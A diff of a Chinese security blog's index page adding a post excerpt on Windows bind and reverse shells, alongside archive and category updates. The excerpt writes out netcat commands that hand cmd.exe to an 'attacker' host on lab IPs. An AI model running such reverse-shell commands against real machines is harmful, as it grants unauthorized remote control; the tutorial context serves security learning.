@@ -346,6 +346,46 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2019/08/03/Windows-Reverse-Shell/" >
+            
+                <span>Windows 反弹 Shell</span>
+        </a>
+        <div class="abstract-content">
+            NC 反弹 shell攻击场景：
+12　　Victim IP：  192.168.2.10　　Attacker IP：192.168.2.11
+
+正向 Shell我们想要弹回Victim的Shell，使用如下命令：
+Victim：nc -lvp 9999 -e cmd.exe
+Attacker：nc 192.168.2.10 9999 
+ps：先在肉鸡上开一个cmd服务，然后在攻击机上进行连接
+反向 ShellAttacker：nc -vlp 9999
+Victim：nc 192.168.2.11 9999 -e cmd.exe
+ps：先在攻击机上进行监听，然后在肉鸡上给Attacker...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/03</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "木马后门">木马后门</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "PowerShell">PowerShell</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2019/08/03/AWD-Bugs-Fix/" >
             
                 <span>AWD攻防赛之各类漏洞FIX方案</span>
@@ -674,37 +714,6 @@ DN...
         <a class="post-tag" href="javascript:void(0);" data-tags = "密码研究">密码研究</a>
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "CBC">CBC</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/03/24/symmetric-and-asymmetric-crypto-system/" >
-            
-                <span>对称密码体制和非对称密码体制</span>
-        </a>
-        <div class="abstract-content">
-            对称加密 (Symmetric Key Encryption)对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。对称加密有很多种算法，由于它效率很高，所以被广泛使用在很多加密协议的核心当中。自1977年美国颁布DES（Data Encryption Standard）密码算法作为美国数据加密标准以来，对称密码体制迅速发展，得到了世界各国的关注和普遍应用。对称密码体制从工作方式上可以分为分组加密和序列密码两大类。
-算法优缺点对称加密算法的优点：算法公开、计算量小、加密速度快、加密效率高。
-对称加密算法...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "密码研究">密码研究</a>
     
 </div>
             
@@ -1758,9 +1767,26 @@ DN...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 64
+        Total : 65
         </div>
         <!-- search  -->
         
@@ -1773,6 +1799,11 @@ DN...
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span><a class="archive-post-title" href= "/2020/06/22/pentesting1/" >从0到1学会搭建小型企业拓扑到由外向内的渗透测试</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2279,6 +2310,8 @@ jsonContent:
         <span class="sidebar-category-name" data-categories="软件工程"><span class="iconfont-archer">&#xe60a;</span>软件工程</span>
     
         <span class="sidebar-category-name" data-categories="大数据"><span class="iconfont-archer">&#xe60a;</span>大数据</span>
+    
+        <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
